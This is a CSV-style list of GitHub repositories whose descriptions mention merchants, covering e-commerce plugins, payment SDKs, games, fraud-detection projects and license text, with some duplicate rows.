0,https://github.com/Kendysond/Selar-widget-for-wordpress.git,This sets up a beautiful widget for a Selar product or merchant profile.,,1
0,https://github.com/lsc1025/MerchantPortal.git,Merchant Portal is a wire-frame that allows billers to manage their pre-authorize payment orders,,1
0,https://github.com/udovenko/google_merchant.git,Provides functionality for Google Merchant feed generation in .atom format. Additionally allows to create a model for Google Products Categories using Awesome Nested Set gem and build categories tree from remote plain text file provided by Google.,,1
0,https://github.com/noxteryn/Cool-Merchant.git,Cool Merchant is a mod for Terraria that aims to lessen the grinding by adding a chance for the Travelling Merchant to sell some of the ingredients for crafting the Cell Phone and the Ankh Shield.,,1
0,https://github.com/senesh-deshan/Almariya-Shopping-Cart-Mobile.git,"Online shopping platform designed for the competitive clothing industry. This enables users to find clothing items according to their fit by using advanced filters, comparing merchants against the prices.",,1
0,https://github.com/amit-agni/amex2019-av-hackathon.git,Create a machine learning model to predict whether a customer will redeem a given coupon for the marketing campaigns run by the Amex merchants. Done as part of Analytics Vidhya American Express 2019 Data hackathon,,1
0,https://github.com/rajapattanayak/smart-aggregator.git,Smart-Aggregator is a hackathon project for ETH Singapore which aims to build ETH based marketplace for Advertisers (aka Merchants) and Publishers (aka Sellers) and Consumers (aka Buyers) using Smart Contract on top of Public or Private Blockchain.,,1
0,https://github.com/senesh-deshan/Almariya-Shopping-Cart-Web.git,"Online shopping platform designed for the competitive clothing industry. This enables users to find clothing items according to their fit by using advanced filters, comparing merchants against the prices.",,1
0,https://github.com/netresearch/dhl-module-shipping-handover-m2.git,This extension enables merchants to print a handover note from within the Magento 2 admin panel. A handover note documents the number of parcels a merchant hands over to DHL eCommerce (either via on-site pick-up or facility drop-off).,,1
0,https://github.com/jpmonette/cnet.git,"CNET API for Node.js is a connection library for CNET API, giving you access to data about tech and consumer electronics products such as computers, digital cameras, MP3 players, and TVs, as well as software titles and merchant pricing from CNET Certified Merchants.",,1
0,https://github.com/Mastercard/cordova-plugin-commerceweb.git,"{""This Cordova plugin enables to use Commerce-web SDK in a Cordova project. Commerce-web is a lightweight library used to integrate Merchants with (https://www.emvco.com/emv-technologies/src/) and  Mastercard's web-based SRC-Initiator. Commerce-web facilitates the initiation of the checkout experience and returns the transaction result to the Merchant after completion""}",,1
0,https://github.com/pranadeepreddy/shopnow.git,ShopNow is web application build using django and react which is similar to Flipkart app in which customer can see a wide range of products and add them to cart and place the order after logged in. Merchants can add the products to the site for sale. Admin can manage these merchant accounts.,,1
0,https://github.com/Halverson-Jason/webStore.git,"This is an e-commerce web template built from Java and Springboot. This is intended to quickly launch an e-commerce site for contractors helping clients, or independent merchants.",hacktoberfest,1
0,https://github.com/pranadeepreddy/shopnow.git,ShopNow is web application build using django and react which is similar to Flipkart app in which customer can see a wide range of products and add them to cart and place the order after logged in. Merchants can add the products to the site for sale. Admin can manage these merchant accounts.,,1
0,https://github.com/pandu19/MerChantModule.git,"Merchant module is also a part of this project he has access to create the coupons and edit the coupons, merchant will have individual dashboard consisting of multiple options",,1
0,https://github.com/ljbdelacruz/MyStoreHubApp.git,Cashless Mobile POS->Create your own merchant account instead of accepting cash can accept it by scanning the merchant account and confirm payment account no need to worry about not having changes ,,1
0,https://github.com/JimboHamez/Shopify_Google_Product_Ads_Update_Tool.git,This Python script is used to generate Product data from Shopify Stores and upload into Google Merchant Centre.,,1
0,https://github.com/WeiChienHsu/Payment_Note.git,"Merchant Initiated Transactions(MITs), Payments Service Directive 2 (PSD2) , Strong Customer Authentication (SCA), Stripe business model for subscription use-cases",,1
0,https://github.com/taylorsmith1/Grocerease.git,Grocerease is an automatic grocery inventory tracking service that focuses on eliminating a barrier to entry through merchant integration.,,1
0,https://github.com/es-bimasakti/winpay-android-sdk.git,SDK ini dibuat untuk memudahkan pemilik usaha atau Merchant dalam melakukan integrasi ke Payment Gateway WinPay dengan platform Android.,,1
0,https://github.com/ThyWoof/SolastaCustomMerchants.git,This Mod allows you to edit any merchant stock list in the game Solasta: Crown of the Magister,,1
0,https://github.com/dawidurbanski/woocommerce-google-merchant-gtin.git,Simple extension for WooCommerce Google Merchant XML by WP Desk. Allow each variation has separate gtin number.,,1
0,https://github.com/ScriptaGames/sub-hunt.git,"Loot Race: Hunt for the Merchant Royal.  A Submarine treasure hunting game for LD48. Theme ""Deeper and Deeper""",,1
0,https://github.com/jobannon/rails_eng.git,A exercise using fictional merchant data to create and expose multiple endpoints in a Rails API server,,1
0,https://github.com/dinesh3836/paytmGratify.git,paytmGratify is a paytm module which helps in hassle free money transfer from Merchant Sub-Wallet to customer wallet,,1
0,https://github.com/jlegs/personal-website.git,"{""This is my arena fighter game. it was going to be an RPG but i just got the basic merchant and fighting systems up first, so right now it's more of an arena fighter, which is currently the working title""}",,1
0,https://github.com/Cat-Lady/Bounty-Fix.git,"This ES plugin makes Pirates/Marauders that are subject of Bounty Hunting missions be properly seen as enemies by Militia/Navy/Deep Security/Merchants and other forces that should dislike Marauders/Pirates. In other words, militia will no longer ""pick their noses"" watching as pirates plunder your merchant fleet in their system, just because said pirates have a bounty on their head that you want to collect.",,1
0,https://github.com/MasterSkriptor/DotNetCore2-Framework.git,"A Dot Net Core Framework that uses generic data services, and other useful services for website dev, such as an smtpclient service and merchant services.",,1
0,https://github.com/shnergle/ShnergleServer.git,"This is the server used for communication with consumer and merchant app for Shnergle, taking care of data storage and aggregation.",,1
0,https://github.com/sandeepdharmavarapu/retailbanking_casestudy.git,"A case study which asks to find whether a given customer for a particular merchant id & Business unit is dormant, active or New.",,1
0,https://github.com/anuj0612/PaypalDemo.git,"PayPal is the faster, safer way to send money, make an online payment, receive money or set up a merchant account.",,1
0,https://github.com/mahfuzali/payment-gateway.git,An API based application that will allow a merchant to offer a way for their shoppers to pay for their product.,"payment-gateway,asp-net,dotnet5,docker,postgresql",1
0,https://github.com/DHasib/Delivery-Management-System-Front-End-Using-Quasar.git,"Delivery Management System  where Author can manage Merchant and their order & Transaction &  Payment. Manage Delivery boy Employee and their Task, salary, destination etc",,1
0,https://github.com/thegamestudio/LookNewRecipe.git,Look! New Recipe! a World of Warcraft Addon to alert the player when a new recipe is found on a merchant.,,1
0,https://github.com/benwad/Space-Merchant.git,"Graphically similar to old-skool Asteroids, Space Merchant allows the player to travel through a large universe and trade between planets.",,1
0,https://github.com/vocalinkzapp/ZappMerchantLib-R2-Android.git,The Pay by Bank app Merchant Library for Android makes it easy for you to add Pay by Bank app as a new payment method.,,1
0,https://github.com/akg2000/E-commerce_Application.git,"An E-commerce application based on java for an easy intercation between the customer and the merchant, supports various discounts as well as searching by category",,1
0,https://github.com/Atalaa/Shopify-Challenge-Summer-2019.git,"As a Shopify merchant, i present to you my new app that will help me to keep an eye on my collections.",,1
0,https://github.com/kmcandersen/wineshop.git,Development of a custom Shopify theme for a fictitious wine merchant. Mockups: https://www.figma.com/file/ZXHe3J9JWr24sPJIKybuME/wineshop?node-id=234452%3A0,,1
0,https://github.com/sharkbit/BadgeApp.git,Membership and Calendar program for a Range.   Allows tracking of guests and events.  And a small merchant portal to buy badges and supplies.,,1
0,https://github.com/Madhu-Vamsi/active-merchant-Credit-Card-Processor.git,"A repository which validates, transacts, voids, and refunds credit cards. Takes help of awesomesauce payment gateway by Spreedly Inc. Built on top of active merchant gem. Ruby.",,1
0,https://github.com/jeri-dilts/pizza.git,"Pizza Pie! is a merchant social-esque React App, Airtable build where the user can interactively build their own pizza, name it, and place it for order.",,1
0,https://github.com/canonicalchris/old-merchant-marine.git,"A record of the interpretation of the E book ""The Old Merchant Marine"" by Ralphe D Paine (http://www.gutenberg.org/files/3099/3099-h/3099-h.htm)",,1
0,https://github.com/Madhu-Vamsi/active_merchent.git,A basic HTTP request application to a virtual credit card gateway for authorizing/declining transactions. Developed using Ruby and active_merchant gem ,,1
0,https://github.com/ZoranWong/pinehub-merchant.git,pinehubÊòØÈùíÊùæÈõÜÂõ¢ÁöÑ‰∏ÄÊ¨æÂ§ßÊï∞ÊçÆÁîµÂïÜÂàÜÊûêÂπ≥Âè∞Ôºåpinehub-merchant‰∏∫ÂïÜÂÆ∂Á´ØÂ∞èÁ®ãÂ∫è,,1
0,https://github.com/Madhu-Vamsi/active-merchant-Credit-Card-Processor.git,"A repository which validates, transacts, voids, and refunds credit cards. Takes help of awesomesauce payment gateway by Spreedly Inc. Built on top of active merchant gem. Ruby.",,1
0,https://github.com/Earthii/askYpBot.git,"The Challenge will be to create a twitter bot that will read the tweets with a particular hashtag who will respond to query like : i would like to buy louis vuitton shoes, the bot will then search the YP api and propose nearby merchants that are selling them",,1
0,https://github.com/prashant18360/EcommerceSoftware.git,"your task is to build a small-scale e-commerce application. The aim of the application is to connect merchants with customers and make the ensuing transaction hassle-free. You must use OOP concepts, especially interfaces and polymorphism while building the application.",,1
0,https://github.com/stmsevanya/E-Wallet-System.git,"E-Wallet is an online prepaid account where one can stock money and perform various transactions when required. Functionalities : Creating account, loading money in e-wallet from banks and debit cards, depositing money to banks, sending money to other users and registered merchants.",,1
0,https://github.com/Coriunder/MSU.git,"MSU means Merchant Sign Up - this is a little project we created to help our clients onboard merchant into their backend system, the JS is simple - create a form and connect it to the fields allowed in the service.  The tool allows you to decide which fields are mandatory or not in the JSON file.  Mobile versions of this project will be published soon.",,1
0,https://github.com/aoakalin/bannerlord-vartsTradeGuild.git,"By installing this mod, you will join to VARTS Trade Guild as their newest member. They are a network of merchants, workshop owners, caravan leaders, slave traders, even spies. Your new network will allow you to find a fellow agent in every town. They will provide precious information that you definitely need, free of charge as a membership perk.",,1
0,https://github.com/ikramrahhali7/ArganOil-.git,Our project will launch a platform for buying and selling ArganOil products and the rest of the health products . payment will be made in crypto currencies and we will be focusing on our ARGAN Token payments . Merchants will be allowed to sell their products on our platforms and payment will be made in Crypto currencies. We have created ARGAN Token In TRC20,,1
0,https://github.com/bilalprofile/POS.git,"A point of sale (POS) is a place where a customer executes the payment for goods or services and where sales taxes may become payable. A POS transaction may occur in person or online, with receipts generated either in print or electronically. Cloud-based POS systems are becoming increasingly popular among merchants.",,1
0,https://github.com/ohmpatel1997/pay-later.git,"Pay Later is a POC application for leading fintech company Simpl (https://getsimpl.com/), which enables users to make transactions with partnered merchants immediately and users can pay later on a monthly basis based on their billing. The idea behind this project is to model the architecture, designing the database models and microservices. The project is entirely built using Golang.","golang,database",1
0,https://github.com/IndianECommerceDevelopers/OpenCart.git,OpenCart is an open source PHP-based online shopping cart system. A robust e-commerce solution for Internet merchants with the ability to create their own online business and participate in e-commerce at a minimal cost.  This is a forked repository.  For the Main repository please refer here http://code.google.com/p/opencart/,,1
0,https://github.com/everypay/everypay-whmcs.git,"This is the EveryPay payment gateway plugin for WHMCS. Allows merchants to accept credit cards, debit cards, with the WHMCS store. It uses a seamless integration, allowing the customer to pay on your website without being redirected away from your WHMCS website.",,1
0,https://github.com/hycubetech/Pay_Hycube_2018.git,"Bitcoin is a powerful peer-to-peer platform for the next generation of financial technology. The decentralized nature of the Bitcoin network allows for a highly resilient value transfer infrastructure, and this allows merchants to gain greater profits. Unlike other payment methods, Bitcoin payments cannot be reversed, so once you are paid you can ship! No waiting days for a payment to clear.",,1
0,https://github.com/pravams/magento-stripe.git,"Stripe Payment Module for Magento allows Merchants to use their Stripe accounts for accepting payments online. It allows the Customer to enter their Credit Card details on the Magento store itself, without redirecting to the payment gateway site. The module is also PCI compliant as it does not store credit card details in Magento. This module supports Authorize and Capture for payments using Credit Cards.","magento,stripe-payment",1
0,https://github.com/harshit-8080/FarmingAssitant.git,A web  Application For Farmer and Merchant where both can find Each other based on their choice of crop and location.Also their is full guidance for Become a Farmer.,,1
0,https://github.com/jaui21/order-list-by-product.git,This is a custom backend module for Magento 1.7- 1.9. This module will add another item under ORDERS. This will list the orders per product so its easier for the merchant to export the sales date by products,,1
0,https://github.com/AhsanAyub/OnlineSuperShop.git,"Online Super Shop - where cloths will be sold by the merchant for the customers. In order to place successful purchase, only registered users will be able to do so. MVC framework is followed while building this project.",,1
0,https://github.com/AlexPietz/DispensED-Mirror.git,"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. ",,1
0,https://github.com/marshmallow-packages/feeds-google-shopping.git,This Laravel package will make it super easy to generate your Google Shopping feed to include to your Google Merchant account. Combined with our Google Categories package this works amazing üóÉ,,1
0,https://github.com/ettaegbe/Icemix-Mobile-Money-Android-Library.git,This a mobile money library for collecting payment through mobile money payment with android particularly for Africa. The aim is that the merchant communicate directly with the main mobile money provider rather than a third party.,,1
0,https://github.com/mrinal1704/Credit-Card-Transaction-Fraud-Detection-using-Supervised-Machine-learning-with-an-Imbalanced-dataset.git,"Credit card fraud is a burden for organizations across the globe. Specifically, $24.26 billion were lost due to credit card fraud worldwide in 2018, according to shiftprocessing.com. In this project, our goal was to build an effective and efficient model to predict fraud. We analyzed a real-world dataset that contained a list of government related credit card transactions over the 2010 calendar year. The data presented a supervised problem as it included a column showing the transaction‚Äôs fraud label (whether a transaction was fraudulent or not). It also contained identifying information about each transaction such as the credit card number, merchant, merchant state, etc. The dataset had 96,753 records and 10 data fields. We first described and visualized each of the 10 data fields, cleaned the dataset, and filled in missing values. Then we created many variables and performed feature selection. Finally, we created a variety of machine learning models (both linear and nonlinear) and highlighted our results. ","supervised-machine-learning,imbalance-classification,feature-engineering,feature-extraction,fraud-detection",1
0,https://github.com/coreydaj/LeanFT.git,This is a repository of LeanFT demo assets to be used for demonstration purposes only by those authorized in writing from HP and its successors. No warranty of merchantability or fitness for a particular purpose is implied or conveyed.,,1
0,https://github.com/masterghost2002/Valid_CC_Number_Check.git,This is a simple C program Which use a simple logic to check is the cc number is correct or not and also tells the merchant of the credit/debit card ,,1
0,https://github.com/ritikmaheshwari29/Diamond-Price-Prediction.git,Business Scenario: A diamond merchant has come to you for help. They want to create an automated system to predict the apt price of a diamond based on its shape/size/color etc.,,1
0,https://github.com/StocksExchange/ruby-client.git,"Stocks.Exchange provides all the core exchange functionality, and additional merchant tools available via the HTTP API where all returned messages are in JSON. Its much easier to work with the API by using one of the clients provided by Stocks.Exchange, so while this page describes the API in case you want or need to build your own client, the examples use the Ruby client.",,1
0,https://github.com/Cart2Cart/xt-Commerce-to-OpenCart-Migration-Module.git,Cart2Cart: xt:Commerce to OpenCart Migration Module is a hand of help for e-merchant that intend to change their shopping cart having no technical skills. An automated migration process is not going to take any efforts and your Source store won‚Äôt be downtimed in the process of switch. Use this plugin to set a connection between your stores and provide safe data interaction. ,,1
0,https://github.com/siponcode/Elo-Merchant-Category-Recommendation---Python.git,"Imagine being hungry in an unfamiliar part of town and getting restaurant recommendations served up, based on your personal preferences, at just the right moment. The recommendation comes with an attached discount from your credit card provider for a local place around the corner!  Right now, Elo, one of the largest payment brands in Brazil, has built partnerships with merchants in order to offer promotions or discounts to cardholders. But do these promotions work for either the consumer or the merchant? Do customers enjoy their experience? Do merchants see repeat business? Personalization is key.  Elo has built machine learning models to understand the most important aspects and preferences in their customers‚Äô lifecycle, from food to shopping. But so far none of them is specifically tailored for an individual or profile. This is where you come in.  In this competition, Kagglers will develop algorithms to identify and serve the most relevant opportunities to individuals, by uncovering signal in customer loyalty. Your input will improve customers‚Äô lives and help Elo reduce unwanted campaigns, to create the right experience for customers.",,1
0,https://github.com/bharat1510/Commuters-Guide.git,"Web application for commuters, travelers, merchants & common people who are used to travel whether it is by railway or by bus or by the highway. This web app helps them to choose the fastest, shortest & best root for their journey. Our app also suggests the best way for their journey. In this app, people make their accounts & through this account, they find the best way & best root both. In this app, you can also create the event according to your comfort. If someone also goes with you then they can contact you & join you on your journey if you accept their request.","commuters-guide,java-jsp,jsp,mysql,bus-booking,train-bookin,private-events",1
0,https://github.com/pouriamo66/-analytics-system-for-predicting-and-managing-fraud-in-financial-payment-services-.git," Build a Classification model by analyzing the transactional data (Cash-In, Cash-Out, Debit, Payment and Transfer) that consists of both normal customer behavior and fraudulent behavior to correctly categorize the transactions into fraudulent and non-fraudulent.    This goal will be achieved by investigating into following research questions with respect to the available dataset in order to build a model with the highest possible success rate:   ‚Ä¢ What types of transactions are actually fraudulent in nature? ‚Ä¢ What determines whether or not the feature ‚ÄòisFlaggedFraud‚Äô (illegal) gets implemented? ‚Ä¢ Are expected merchants accounts accordingly labelled? ‚Ä¢ Are there account labels common to fraudulent transactions?   ",,1
0,https://github.com/krunalsojitra/Paytm-Payments_Paytm_Web_Sample_Kit_PHP.git,"How to install the sample kit on a web server: Copy PaytmKit folder in document root of your server (like /var/www/html) Open config_paytm.php file from the PaytmKit/lib folder and update the below constant values PAYTM_MERCHANT_KEY ‚Äì Can be downloaded from the Paytm portal. One time downloadable PAYTM_MERCHANT_MID - MID (Merchant ID) can be collected from Paytm team PAYTM_MERCHANT_WEBSITE - Website name can be collected from Paytm team PaytmKit folder is having following files: TxnTest.php ‚Äì Testing transaction through Paytm gateway. pgRedirect.php ‚Äì This file has the logic of checksum generation and passing all required parameters to Paytm PG. pgResponse.php ‚Äì This file has the logic for processing PG response after the transaction processing. TxnStatus.php ‚Äì Testing Status Query API For Offline(Wallet Api) Checksum Utility below are the methods: getChecksumFromString : For generating the checksum verifychecksum_eFromStr : For verifing the checksum To generate refund checksum in PHP : Create an array with key value pair of following paytm parameters (MID, ORDERID, TXNTYPE, REFUNDAMOUNT, TXNID, REFID) To generate checksum, call the following method. This function returns the checksum as a string. getRefundChecksumFromArray($arrayList, $key, $sort=1)",,1
0,https://github.com/richievos/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/valer00n/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/JordanLeich/Zombie-Survival-Game.git,"This is a zombie survival game where you must make the best choices and decisions possible in order to live. As a survivor, you will encounter zombies, weapons, people, and a merchant to buy from with an in-game currency. Every decision you make has a cause and effect while some lead you to fortune and others lead you to death.","zombies,survival-game,survival,game,game-development,zombies-game,zombies-storyline,python,python3,games",1
0,https://github.com/woto/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/Strd79/Spending_Tracker_App.git,"This was my first individual CodeClan project to create a Spending Tracker App. I built this using Python, Flask, HTML/CSS, PostgreSQL and the psycopg. Users can track individual transactions, including the date, merchant and a tag (e.g. Food Shopping, Travel etc). They can then filter transactions by any of the above criteria and see a running total spent.",spending-tracker,1
0,https://github.com/apavlyut/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/nationalparkservice/SongMeterToNVSPL.git,R code to process audio files collected by Song Meters (Wildlife Acoustics) to convert audio to sound pressure levels in standard NPS format (NVSPL). Sound levels are calibrated using an end to end calibration from a modified version of PAMGuide (Merchant et al 2014),,1
0,https://github.com/grengojbo/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,1
0,https://github.com/dealsmanoj/GSTBillingApplication.git,"{""We are working on an open source GST billing Web Application in Asp.Net. All the developers are invited who is willing to join us in the development process of this web-application. This is a simple billing application where user can create GST Invoice online. The basic functionality has been added in the application like registering the company with company profile, Creating products categories and adding products, creating customers and finally creating invoices for its clients. So all of the merchants are well aware of the work flow of the application and can easily be adoped by its users. It is self developed so it is not complicated like tally or busy and can be customized and tailored as per the client requirements. The application will be developed in various faces. So if is a great chance for a beginner to learn all the concepts of a dynamic web-based project from front-end designing to complete coding in C# with Asp.Net.  The previous version of this billing package is a desktop version and already running to many clinets but they are also demanding that they require an online system or web-based system so that they can check/create invoice any time from anywhere from a centralized system. That's why we have started this project.  Some of the features of the application is: Online billing, centraized data storage and security, Accessible on mobile devices(billing on the way), SMS and Email Invoice We also invites experts to co-ordinates with us in the development and further enhancement of this project for market implementation as some of our clients already using the previous version of this application. ""}",,1
0,https://github.com/BlockchainLabs/NeosCoin.git,"{""Neos is different. How? In every way possible.  Neos isn't meant to be just a wallet, or another token to simply trade for Bitcoin. Neos is canvas on which every shade of every color can splash onto with ease. Our techniques may cause controversy, but we're ok with that.   SHA-256 Mining  Endless integration possibilities  Unique and innovative features  Spend Neos online or invest it  Completely dedicated team  New developments constantly |Live Pool Stats  Are you mining Neos? Enjoy the convenience of monitoring your performance on our pools without having to leave Neos! In-App Trading  The days of needing to navigate to your preferred exchanges to trade are now gone. Execute orders, deposit, and monitor performance directly from Neos. v2 is HERE!  Set to out-do v1 on every possible level, v2 boasts even more functionality, unseen features, and a smoother experience. NEOS SPECIFICATIONS Algorithm: SHA-256  Total coins: 21 Million (after the 21 million cap, a perpetual reward of 0.0625 remains per block to keep the chain moving)  Halving every: 210,000 blocks  Fair launch: Block 2 - 1001 the block reward was 0.1. Block 1002+ normal block reward  Block reward: 50 NEOS  Block time: 5 minutes  Tx fees: 0.00000001  Block confirmations: 120  Transaction confirmations: 6  Difficulty adjustment: per block (Dark Gravity Wave)  Launch date: 8/24/14 5PM EST  Coins offered in ICO: 1,050,000.00 | We are defying boundaries and redefining standards.  Real World Usability  Neos development is moving in a steady and reliable direction towards bridging the gap between merchants and consumers. Live Pool Stats  Are you mining Neos? Enjoy the convenience of monitoring your performance on our pools without having to leave Neos! In-App Trading  The days of needing to navigate to your preferred exchanges to trade are now gone. Execute orders, deposit, and monitor performance directly from Neos. v2 is HERE!  Set to out-do v1 on every possible level, v2 boasts even more functionality, unseen features, and a smoother experience. ""}",,1
0,https://github.com/zeddarn/cron-job.git,"A cron job that does the following. 1.\tQueries database order table and check for outstanding orders. An order is made when a customer makes a payment. An outstanding order is assumed to be an order with status as PENDING 2.\tUsing the PENDING order, Submit the order Transaction ID to a payment gateway and print the results. For the purpose of the test, use PESAPAL payment gateway. You will need to create Merchant Account on Pesapal so that you can get a Merchant Key and Secret Key. Below is the field order of the table. id >> int type, auto increment Primary Key status  >> > int type, Status of Payment (Default is pending) transaction_id  >> varchar, this is the key from payment gateway. The database order table is populated with ‚Äòfake‚Äô transaction ID.  Reference: https://www.pesapal.com/home/integration#reference . ",,1
0,https://github.com/naeemahaz/credit_card_marketing_model.git,"{""A credit card is a payment card issued to users (cardholders) to enable the cardholder to pay a merchant for goods and services based on the cardholder's promise to the card issuer to pay them for the amounts so paid plus the other agreed charges.The card issuer (usually a bank) creates a revolving account and grants a line of credit to the cardholder, from which the cardholder can borrow money for payment to a merchant or as a cash advance. In other words, credit cards combine payment services with extensions of credit. Complex fee structures in the credit card industry may limit customers' ability to comparison shop, help ensure that the industry is not price-competitive and help maximize industry profits. Because of this, legislatures have regulated credit card fees.""}",,1
0,https://github.com/phyverse/khalti.git,"# Woocommerce Plugin for Khalti  The basic steps to follow:  1. Go to the plugin section in your WordPress dashboard 2. Click on Add New and upload the zip file of Khalti WooCommerce plugin and upload it 3. After installation is complete, go to the WooCommerce section and to Settings 4. Go to Checkout option where you can find Khalti among other payment gateways 5. Click on Khalti option and enter your test secret key and test public key which you can get at Keys section in your merchant account 6. Click on save changes and complete a Khalti wallet transaction to pass the test 7. If you pass the test, Go to keys section in your merchant account, you can get your Live keys their 8. Enter your live key and click save changes",,1
0,https://github.com/AI-MEGHA/Predicting-Coupon-Redemption.git," XYZ Credit Card company regularly helps its merchants understand their data better and take key business decisions accurately by providing machine learning and analytics consulting. ABC is an established Brick & Mortar retailer that frequently conducts marketing campaigns for its diverse product range. As a merchant of XYZ, they have sought XYZ to assist them in their discount marketing process using the power of machine learning. Discount marketing and coupon usage are very widely used promotional techniques to attract new customers and to retain & reinforce loyalty of existing customers. The measurement of a consumer‚Äôs propensity towards coupon usage and the prediction of the redemption behaviour are crucial parameters in assessing the effectiveness of a marketing campaign. ABC promotions are shared across various channels including email, notifications, etc. A number of these campaigns include coupon discounts that are offered for a specific product/range of products. The retailer would like the ability to predict whether customers redeem the coupons received across channels, which will enable the retailer‚Äôs marketing team to accurately design coupon construct, and develop more precise and targeted marketing strategies.",,1
0,https://github.com/SahilGadge/NFC-Based-Secured-Payment-System.git,"The proposed system will be used for the payment transferring system. It uses NFC Feature. Use of near-field communication (NFC) technology through an Android Application to digitally transfer money from the payer‚Äôs bank account to the payee‚Äôs bank account with enhanced security and biometric authentication. Consumers who use the NFC Pay application can make secure mobile payments at nearly all merchant locations, via NFC. User pay payment by NFC Tag.",,1
0,https://github.com/nitinwagadia/Shopit.git,"Shop It! is a cloud based mobile application for enhancing the shopping experience for users on the go. Our application can recommend best offers in nearby stores, deals in restaurants and best discounts on products based on your location. Project uses highly scalable and efficient Amazon services like SQS and SNS for ensuring high availability. For notifications, we have used Google Cloud Messaging (GCM) for real time service. We are using REST API for providing responses from backend Elasticsearch engine scanning through high amount of geocoded deals data ensuring minimum response time for users. With this application users now have a power to reach beyond just an conventional shopping application. By registering as a merchant in the app and user can start own business or boost an existing one.",,1
0,https://github.com/jatotko/test.git,"/**  * Created with JetBrains WebStorm    * Date: 6/20/13  *  Copyright 2013 Brandon Xavier  This file is part of CB-AppDevKit.  CB-AppDevKit is free software: you can redistribute it and/or modify  it under the terms of the GNU General Public License as published by  the Free Software Foundation, either version 3 of the License, or  (at your option) any later version.  CB-AppDevKit is distributed in the hope that it will be useful,  but WITHOUT ANY WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the  GNU General Public License for more details.  You should have received a copy of the GNU General Public License  along with CB-AppDevKit.  If not, see <http://www.gnu.org/licenses/>.  */  var AppDevKit = true; var ADK = {\'readyToRun\': false,     \'scriptName\': """",     \'initFunction\': """",     \'settingsChoices\':",,1
0,https://github.com/Hengxiugao/CGDemo.git,"CGDemo is a companion of the textbook for L. Ammeraal and K. Zhang, Computer Graphics for Java Programmers,  2nd Edition, Wiley, 2006. Copyright (C) 2006  Janis Schubert, Kang Zhang, Leen Ammeraal . This program is free software; you can redistribute it and/or  modify it under the terms of the GNU General Public License as  published by the Free Software Foundation; either version 2 of  the License, or (at your option) any later version.   This program is distributed in the hope that it will be useful,  but WITHOUT ANY WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   See the GNU General Public License for more details.    You should have received a copy of the GNU General Public  License along with this program; if not, write to  the Free Software Foundation, Inc., 51 Franklin Street,  Fifth Floor, Boston, MA  02110-1301, USA. ",,1
0,https://github.com/Anirudhhat61/DigitalCash.git,"{""Basically this protocol implements an electronic cash system, in which the digital cash cannot be copied or reused more than once and the privacy of the customer's identity is  guaranteed.The system allows money transaction between three parties: Customer, Merchant and Bank. The electronic cash (ecash) used during these transactions is a file that contains:‚Ä¢the amountof the transaction involved; ‚Ä¢a uniqueness string number;‚Ä¢identity strings which contain the identity of the customer (this information remains secret unless the customer tries to use the ecash illicitly ‚Äìmore than once);‚Ä¢bank's signature (before the customer can use the ecash) The services provided for each party is described as follows:Customer‚Ä¢generates N orders for each money order the customer wants to make‚Ä¢and assigns a different random uniqueness string number for each of‚Ä¢the N ecash money orders‚Ä¢implements the secret splitting and bit commitment protocols used to‚Ä¢generate the identity strings that describe the customer's name, address and any other piece of identifying information that the bank wants to see.‚Ä¢implements a blind signature protocol for all N money orders‚Ä¢automatically complies to reveal the half of the identity string chosen by‚Ä¢the merchantMerchant‚Ä¢verification of the legitimacy of the bank's signature‚Ä¢random generator of the selector string, which determines the half ofthe identity string the customer is required to revealBank‚Ä¢random choice of 1 out of N money orders sent by the customer toremain unopened‚Ä¢an algorithm that certifies that all the N-1 money orders have been filledwith valid information‚Ä¢a procedure to certify that the orders received from merchants have notbeen used previously and storage of the uniqueness string and identitystrings of the orders in a database file‚Ä¢Appropriate measures against reuse of the ecash""}",,1
0,https://github.com/BitLLCoinDev/BitLLCoin.git,"BITLLCOIN(BTLLC) IS A CRYPTOCURRENCY BASED ON PEER TO PEER ONLINE PAYMENT NETWORK USING SCRYPT. We create BitLLCoin(BTLLC) to develop technical features bringing additional benefits to both consumers and service providers. We will build a wallet, based on Blockchain technology, that can store a variety of digital currencies and the BitLLCoin(BTLLC) Exchange can trade all of them.Also we will build web platform for merchant so they can accept payments with all kind of cryptocurrency. BitLLCoin(BTLLC) Debit Card where you can store your cryptocurrency and make a payment all over the world.",,1
0,https://github.com/augyg/Amazon-Web-Scrape.git,"My parents were spending 3 hours a day pulling and analyzing data from amazon in order to build their purchase order report. SO I said, hey fam have you heard of webscraping? By pulling the data from Amazon through webscraping, (since there is no API for merchant accounts) my parents now click a button that generates a simplified report stating the marginal profit of each unit for each SKU. All they have to do now is send the numbers by email to suppliers which takes 10 minutes. ",,1
